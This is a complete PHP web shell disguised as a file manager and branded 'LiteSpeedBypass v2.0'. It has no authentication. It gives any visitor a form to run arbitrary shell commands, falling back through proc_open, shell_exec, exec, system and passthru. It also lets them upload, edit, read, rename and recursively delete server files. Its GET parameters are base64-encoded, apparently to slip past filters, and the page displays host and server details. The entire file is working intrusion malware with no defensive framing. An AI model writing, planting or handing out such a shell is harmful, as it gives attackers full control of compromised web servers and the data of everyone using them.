<?php
function hsc($s){return htmlspecialchars($s);}
function nf($n,$d=2){return number_format($n,$d);}
function x($b){return base64_encode($b);}
function y($b){return base64_decode($b);}
function safePath($p,$fb){if(empty(trim($p)))return $fb;$r=@realpath($p);return($r===false||!is_dir($r))?$fb:$r;}
function deleteDir($d){if(!file_exists($d))return true;if(!is_dir($d))return unlink($d);foreach(scandir($d)as $i){if($i=='.'||$i=='..')continue;if(!deleteDir($d.DIRECTORY_SEPARATOR.$i))return false;}return rmdir($d);}
function fmtSize($b){if($b>=1073741824)return nf($b/1073741824).' GB';if($b>=1048576)return nf($b/1048576).' MB';if($b>=1024)return nf($b/1024).' KB';return $b.' B';}
function getOwner($p){$u=@fileowner($p);if($u===false)return'—';if(function_exists('posix_getpwuid')){$i=posix_getpwuid($u);return $i?hsc($i['name']):$u;}return $u;}
function runCmd($cmd){
$out='';$err='';$mt='';
if(function_exists('proc_open')){$ds=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];$p=proc_open($cmd,$ds,$pp);if(is_resource($p)){$out=stream_get_contents($pp[1]);$err=stream_get_contents($pp[2]);fclose($pp[1]);fclose($pp[2]);proc_close($p);$mt='proc_open';}}
elseif(function_exists('shell_exec')){$out=(string)shell_exec($cmd.' 2>&1');$mt='shell_exec';}
elseif(function_exists('exec')){exec($cmd.' 2>&1',$lines);$out=implode("\n",$lines);$mt='exec';}
elseif(function_exists('system')){ob_start();system($cmd.' 2>&1');$out=ob_get_clean();$mt='system';}
elseif(function_exists('passthru')){ob_start();passthru($cmd.' 2>&1');$out=ob_get_clean();$mt='passthru';}
return['out'=>$out,'err'=>$err,'mt'=>$mt];}

date_default_timezone_set(date_default_timezone_get());
$S=dirname(realpath(__FILE__));
foreach($_GET as $k=>$v)$_GET[$k]=y($v);
$D=safePath(isset($_GET['d']) && $_GET['d']!=='' ? $_GET['d'] : $S, $S);
if(!@chdir($D)){$D=$S;@chdir($D);}
$sm='';$vr='';

if($_SERVER['REQUEST_METHOD']==='POST'){
if(isset($_FILES['fileToUpload'])){
$t=$D.'/'.basename($_FILES['fileToUpload']['name']);
$sm=move_uploaded_file($_FILES['fileToUpload']['tmp_name'],$t)
?'<div class="alt ok">✓ File "<b>'.hsc(basename($_FILES['fileToUpload']['name'])).'</b>" uploaded.</div>'
:'<div class="alt err">✗ Upload failed.</div>';
}elseif(!empty($_POST['folder_name'])){
$nf=$D.'/'.$_POST['folder_name'];
$sm=!file_exists($nf)&&mkdir($nf)?'<div class="alt ok">✓ Folder created.</div>':'<div class="alt err">✗ Failed or exists.</div>';
}elseif(!empty($_POST['file_name'])){
$nf=$D.'/'.$_POST['file_name'];$vb=file_exists($nf)?'edited':'created';
$sm=file_put_contents($nf,$_POST['file_content'])!==false?'<div class="alt ok">✓ File '.$vb.'.</div>':'<div class="alt err">✗ Save failed.</div>';
}elseif(isset($_POST['delete_file'])){
$t=$D.'/'.$_POST['delete_file'];
if(file_exists($t)){$ok=is_dir($t)?deleteDir($t):unlink($t);$sm=$ok?'<div class="alt ok">✓ Deleted.</div>':'<div class="alt err">✗ Delete failed.</div>';}
else $sm='<div class="alt err">✗ Not found.</div>';
}elseif(isset($_POST['rename_item'],$_POST['old_name'],$_POST['new_name'])){
$o=$D.'/'.$_POST['old_name'];$n=$D.'/'.$_POST['new_name'];
$sm=file_exists($o)?(rename($o,$n)?'<div class="alt ok">✓ Renamed.</div>':'<div class="alt err">✗ Rename failed.</div>'):'<div class="alt err">✗ Not found.</div>';
}elseif(isset($_POST['cmd_input'])){
$r=runCmd($_POST['cmd_input']);
if($r['mt']===''){$vr='<div class="alt err">✗ All exec functions disabled.</div>';}
else{$lbl=!empty($r['err'])?'Err':'Out';$cnt=hsc(!empty($r['err'])?$r['err']:$r['out']);
$vr='<div class="rp"><div class="rph"><span>⚡ <code>'.hsc($_POST['cmd_input']).'</code> <span class="rl">'.$r['mt'].'</span></span><span class="rl">'.$lbl.'</span></div><pre class="rpre">'.$cnt.'</pre></div>';}
}elseif(isset($_POST['view_file'])){
$f=$D.'/'.$_POST['view_file'];
$vr=file_exists($f)?'<div class="rp"><div class="rph"><span>📄 <code>'.hsc($_POST['view_file']).'</code></span></div><pre class="rpre">'.hsc(file_get_contents($f)).'</pre></div>':'<div class="alt err">✗ File not found.</div>';
}}

$dirs=array();$files=array();
if(!empty($D)&&is_dir($D)){$raw=@scandir($D);if($raw){foreach(array_diff($raw,array('.','..'))as $i){if(@is_dir($D.'/'.$i))$dirs[]=$i;else $files[]=$i;}}}
natcasesort($dirs);natcasesort($files);
$items=array_merge(array_values($dirs),array_values($files));
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>FM — <?=hsc(basename($D))?></title>
<style>:root{--a:#0a0e1a;--b:#111827;--c:#1a2235;--e:#2d3f5e;--f:#e8edf5;--g:#8898b3;--h:#536282;--i:#4f8ef7;--k:#34d399;--l:#f87171;--m:#fbbf24;--n:#a78bfa;--o:#22d3ee;--p:8px;--q:0 4px 24px rgba(0,0,0,.45)}*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}body{background:var(--a);color:var(--f);font-family:system-ui,-apple-system,sans-serif;font-size:13px;line-height:1.6;min-height:100vh}.wp{max-width:1280px;margin:0 auto;padding:24px 20px 60px}.topbar{display:flex;align-items:center;justify-content:space-between;gap:16px;padding:14px 20px;background:var(--b);border:1px solid var(--e);border-radius:var(--p);margin-bottom:18px;flex-wrap:wrap}.brand{display:flex;align-items:center;gap:10px}.brand .logo{width:32px;height:32px;background:linear-gradient(135deg,var(--i),var(--n));border-radius:7px;display:flex;align-items:center;justify-content:center;font-size:16px}.brand h1{font-size:16px;font-weight:700}.brand h1 span{color:var(--g);font-size:12px;font-weight:400}.meta{color:var(--g);font-size:12px;text-align:right}.meta b{color:var(--f);font-weight:500}.bc{display:flex;align-items:center;flex-wrap:wrap;gap:2px;padding:10px 16px;background:var(--b);border:1px solid var(--e);border-radius:var(--p);margin-bottom:16px;font-size:12px;color:var(--g)}.bc a{color:var(--i);text-decoration:none;padding:2px 5px;border-radius:4px;transition:background .15s}.bc a:hover{background:rgba(79,142,247,.12)}.bc .sep{color:var(--h);margin:0 1px}.ht{background:rgba(52,211,153,.12);color:var(--k);padding:1px 8px;border-radius:20px;font-weight:600;font-size:11px;margin-left:4px}.ac{display:flex;gap:10px;margin-bottom:18px;flex-wrap:wrap}.bn{display:inline-flex;align-items:center;gap:7px;padding:9px 16px;border:none;border-radius:var(--p);font-family:inherit;font-size:13px;font-weight:600;cursor:pointer;transition:all .18s;white-space:nowrap}.bn:hover{transform:translateY(-1px);box-shadow:0 4px 14px rgba(0,0,0,.35)}.bg{background:rgba(52,211,153,.15);color:var(--k);border:1px solid rgba(52,211,153,.3)}.bb{background:rgba(79,142,247,.15);color:var(--i);border:1px solid rgba(79,142,247,.3)}.by{background:rgba(251,191,36,.15);color:var(--m);border:1px solid rgba(251,191,36,.3)}.br{background:rgba(248,113,113,.15);color:var(--l);border:1px solid rgba(248,113,113,.3)}.bg:hover{background:rgba(52,211,153,.25)}.bb:hover{background:rgba(79,142,247,.25)}.by:hover{background:rgba(251,191,36,.25)}.br:hover{background:rgba(248,113,113,.25)}.alt{padding:11px 16px;border-radius:var(--p);margin-bottom:16px;font-size:13px;font-weight:500}.ok{background:rgba(52,211,153,.1);color:var(--k);border-left:3px solid var(--k)}.err{background:rgba(248,113,113,.1);color:var(--l);border-left:3px solid var(--l)}.rp{background:var(--b);border:1px solid var(--e);border-radius:var(--p);margin-bottom:18px;overflow:hidden}.rph{display:flex;align-items:center;justify-content:space-between;padding:10px 16px;background:var(--c);border-bottom:1px solid var(--e);font-size:12px;color:var(--g)}.rph code{font-family:monospace;color:var(--o);font-size:12px}.rl{font-size:11px;padding:2px 8px;border-radius:20px;background:rgba(167,139,250,.15);color:var(--n)}.rpre{padding:16px;font-family:monospace;font-size:12px;line-height:1.7;color:var(--f);overflow-x:auto;max-height:400px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}.tw{border:1px solid var(--e);border-radius:var(--p);overflow:hidden;margin-bottom:30px}.ts{overflow-x:auto}.ft{width:100%;border-collapse:collapse;min-width:860px}.ft thead th{background:var(--c);padding:12px 14px;text-align:left;font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.6px;color:var(--g);border-bottom:1px solid var(--e);white-space:nowrap}.ft thead th:first-child{padding-left:18px}.ft tbody tr{transition:background .12s}.ft tbody tr:hover{background:rgba(255,255,255,.03)}.ft tbody tr+tr td{border-top:1px solid rgba(45,63,94,.5)}.ft td{padding:10px 14px;vertical-align:middle}.ft td:first-child{padding-left:18px}.nc{display:flex;align-items:center;gap:9px}.ic{width:30px;height:30px;border-radius:7px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:15px}.icd{background:rgba(251,191,36,.12)}.icf{background:rgba(79,142,247,.1)}.fl{color:var(--f);text-decoration:none;font-weight:500;font-size:13px}.fl:hover{color:var(--i)}.db{font-size:10px;font-weight:600;background:rgba(251,191,36,.15);color:var(--m);padding:1px 7px;border-radius:20px;margin-left:4px}.cs,.cd{color:var(--g);font-size:12px;white-space:nowrap}.cd{font-family:monospace}.cp{font-family:monospace;font-size:12px;color:var(--o)}.cow{color:var(--n);font-size:12px;font-weight:500}.pw{color:var(--k)}.ca{display:flex;align-items:center;gap:6px}.tb{display:inline-flex;align-items:center;gap:4px;padding:5px 10px;border:none;border-radius:5px;font-size:11px;font-weight:600;font-family:inherit;cursor:pointer;transition:all .15s;white-space:nowrap}.tb:hover{transform:translateY(-1px)}.tbv{background:rgba(79,142,247,.15);color:var(--i);border:1px solid rgba(79,142,247,.25)}.tbd{background:rgba(248,113,113,.1);color:var(--l);border:1px solid rgba(248,113,113,.25)}.tbr{background:rgba(251,191,36,.1);color:var(--m);border:1px solid rgba(251,191,36,.25)}.tbv:hover{background:rgba(79,142,247,.28)}.tbd:hover{background:rgba(248,113,113,.25)}.tbr:hover{background:rgba(251,191,36,.22)}.rw{display:flex;gap:5px;align-items:center}.ri{padding:5px 9px;background:var(--a);border:1px solid var(--e);border-radius:5px;color:var(--f);font-size:12px;font-family:inherit;width:120px;outline:none;transition:border .15s}.ri:focus{border-color:var(--i)}.drow{background:rgba(251,191,36,.02)}.mo{position:fixed;inset:0;background:rgba(0,0,0,.7);backdrop-filter:blur(4px);display:none;align-items:center;justify-content:center;z-index:999;padding:20px}.mo.active{display:flex}.mx{background:var(--b);border:1px solid var(--e);border-radius:12px;width:100%;max-width:520px;box-shadow:var(--q);animation:fu .22s ease}@keyframes fu{from{opacity:0;transform:translateY(16px) scale(.97)}to{opacity:1;transform:none}}.mh{display:flex;align-items:center;justify-content:space-between;padding:18px 22px 16px;border-bottom:1px solid var(--e)}.mh h2{font-size:16px;font-weight:700}.mc{background:none;border:none;color:var(--g);cursor:pointer;font-size:20px;line-height:1;padding:0 2px;border-radius:4px;transition:color .15s}.mc:hover{color:var(--f)}.mb{padding:22px}.fg{margin-bottom:16px}.flb{display:block;margin-bottom:6px;font-size:12px;font-weight:600;color:var(--g);text-transform:uppercase;letter-spacing:.5px}.fi,.fta{width:100%;padding:10px 12px;background:var(--a);border:1px solid var(--e);border-radius:6px;color:var(--f);font-family:inherit;font-size:13px;outline:none;transition:border .15s}.fi:focus,.fta:focus{border-color:var(--i)}.fta{min-height:160px;resize:vertical;font-family:monospace;font-size:12px}.mf{display:flex;gap:10px;padding-top:6px}.mf .bn{flex:1;justify-content:center}.foot{text-align:center;color:var(--h);font-size:12px;padding-top:10px;border-top:1px solid var(--e)}@media(max-width:600px){.ac{gap:7px}.bn{padding:8px 12px;font-size:12px}.meta{display:none}}</style>
</head>
<body>
<div class="wp">
<div class="topbar">
<div class="brand"><div class="logo">📂</div><h1>LiteSpeedBypass <span>v2.0</span></h1></div>
<div class="meta"><b><?=php_uname('n')?></b> · PHP <?=PHP_VERSION?> · <?=date('Y-m-d H:i:s')?> · <?=isset($_SERVER['SERVER_SOFTWARE']) ? hsc($_SERVER['SERVER_SOFTWARE']) : 'Unknown'?></div>
</div>
<div class="bc"><span>📍</span>&nbsp;<?php
$parts=explode(DIRECTORY_SEPARATOR,$D);$built='';
foreach($parts as $pt){if($pt==='')continue;$built.=DIRECTORY_SEPARATOR.$pt;echo'<span class="sep">/</span> <a href="?d='.x($built).'">'.hsc($pt).'</a> ';}
?><a href="?d=<?=x($S)?>" class="ht">⌂ Home</a></div>
<div class="ac">
<button class="bn bg" onclick="om('mF')">📁 New Folder</button>
<button class="bn bb" onclick="om('mE')">📄 New/Edit File</button>
<button class="bn by" onclick="om('mU')">⬆ Upload</button>
<button class="bn br" onclick="om('mC')">⚡ Command</button>
</div>
<?=$sm?><?=$vr?>
<div class="tw"><div class="ts"><table class="ft">
<thead><tr><th>Name</th><th>Owner</th><th>Size</th><th>Modified</th><th>Perms</th><th>Actions</th></tr>
</thead>
<tbody>
<?php foreach($items as $v):
$fp=$D.'/'.$v;
$isdir=@is_dir($fp);
$il=$isdir?'?d='.x($fp):'?d='.x($D).'&f='.x($v);
$rp=@fileperms($fp);$perm=$rp!==false?substr(sprintf('%o',$rp),-4):'?';
$wr=@is_writable($fp);
$ow=getOwner($fp);
$fs=!$isdir?@filesize($fp):false;
$sz=$isdir?'—':($fs!==false?fmtSize($fs):'?');
$mt=@filemtime($fp);$mtime=$mt!==false?date('Y-m-d H:i',$mt):'—';
$rc=$isdir?'drow':'';
?><tr class="<?=$rc?>">
<td><div class="nc"><div class="ic <?=$isdir?'icd':'icf'?>"><?=$isdir?'📁':'📄'?></div><div><a href="<?=$il?>" class="fl"><?=hsc($v)?></a><?php if($isdir)echo'<span class="db">DIR</span>';?></div></div></td>
<td class="cow"><?=$ow?></td>
<td class="cs"><?=$sz?></td>
<td class="cd"><?=$mtime?></td>
<td class="cp <?=$wr?'pw':''?>"><?=$perm?></td>
<td><div class="ca">
<form method="post" style="display:inline"><input type="hidden" name="view_file" value="<?=hsc($v)?>"><button type="submit" class="tb tbv">👁 View</button></form>
<form method="post" style="display:inline" onsubmit="return confirm('Delete <?=addslashes(hsc($v))?>?')"><input type="hidden" name="delete_file" value="<?=hsc($v)?>"><button type="submit" class="tb tbd">🗑 Del</button></form>
<form method="post" style="display:inline"><input type="hidden" name="old_name" value="<?=hsc($v)?>"><div class="rw"><input type="text" name="new_name" class="ri" placeholder="New name…" required><button type="submit" name="rename_item" class="tb tbr">✏ Ren</button></div></form>
</div></td>
</tr>
<?php endforeach?>
</tbody></table></div></div>
<div class="foot">File Manager v2.0 · <?=count($dirs)?> folder<?=count($dirs)!=1?'s':''?>, <?=count($files)?> file<?=count($files)!=1?'s':''?></div>
</div>
<div id="mF" class="mo"><div class="mx"><div class="mh"><h2>📁 New Folder</h2><button class="mc" onclick="cm('mF')">✕</button></div><div class="mb"><form method="post"><div class="fg"><label class="flb">Folder Name</label><input type="text" name="folder_name" class="fi" placeholder="my-folder" required autofocus></div><div class="mf"><button type="button" class="bn br" onclick="cm('mF')">Cancel</button><button type="submit" class="bn bg">Create</button></div></form></div></div></div>
<div id="mE" class="mo"><div class="mx"><div class="mh"><h2>📄 Create/Edit File</h2><button class="mc" onclick="cm('mE')">✕</button></div><div class="mb"><form method="post"><div class="fg"><label class="flb">File Name</label><input type="text" name="file_name" class="fi" placeholder="index.php" required></div><div class="fg"><label class="flb">Content</label><textarea name="file_content" class="fta" placeholder="File content…"></textarea></div><div class="mf"><button type="button" class="bn br" onclick="cm('mE')">Cancel</button><button type="submit" class="bn bb">Save</button></div></form></div></div></div>
<div id="mU" class="mo"><div class="mx"><div class="mh"><h2>⬆ Upload File</h2><button class="mc" onclick="cm('mU')">✕</button></div><div class="mb"><form method="post" enctype="multipart/form-data"><div class="fg"><label class="flb">Select File</label><input type="file" name="fileToUpload" class="fi" required></div><div class="mf"><button type="button" class="bn br" onclick="cm('mU')">Cancel</button><button type="submit" name="submit" class="bn by">Upload</button></div></form></div></div></div>
<div id="mC" class="mo"><div class="mx"><div class="mh"><h2>⚡ Run Command</h2><button class="mc" onclick="cm('mC')">✕</button></div><div class="mb"><form method="post"><div class="fg"><label class="flb">Shell Command</label><input type="text" name="cmd_input" class="fi" placeholder="ls -la" required style="font-family:monospace"></div><div class="mf"><button type="button" class="bn br" onclick="cm('mC')">Cancel</button><button type="submit" class="bn br" style="background:rgba(248,113,113,.25)">Run</button></div></form></div></div></div>
<script>
function om(id){document.getElementById(id).classList.add('active');}
function cm(id){document.getElementById(id).classList.remove('active');}
window.addEventListener('click',function(e){if(e.target.classList.contains('mo')){cm(e.target.id);}});
document.addEventListener('keydown',function(e){if(e.key==='Escape'){var modals=document.querySelectorAll('.mo.active');for(var i=0;i<modals.length;i++){modals[i].classList.remove('active');}}});
</script>
</body>
</html>